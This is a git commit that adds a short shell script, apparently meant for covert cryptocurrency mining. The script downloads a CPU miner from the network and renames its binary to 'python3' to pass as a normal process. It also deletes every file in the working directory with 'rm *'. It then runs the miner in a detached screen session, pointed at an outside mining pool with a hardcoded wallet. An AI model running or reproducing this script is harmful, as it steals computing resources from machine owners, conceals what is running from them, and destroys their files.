a55d8ce37b3b5d1ef864a2f0c765636966bde539
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-10 12:21:04 +0700

    Create LuckQch.sh

---
+++ LuckQch.sh
@@ -0,0 +1,19 @@
+apt install screen -y
+
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
+
+tar -xzf dot
+
+rm dot
+
+mv cpuminer-sse2 python3
+
+mv python3 ~/
+
+rm *
+
+cd ~/
+
+nomer=$((RANDOM % 50 + 1))
+
+screen ./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QhKiKc1JTCBKzTLDC9gszLX13F2MjWAq35.DOT$nomer
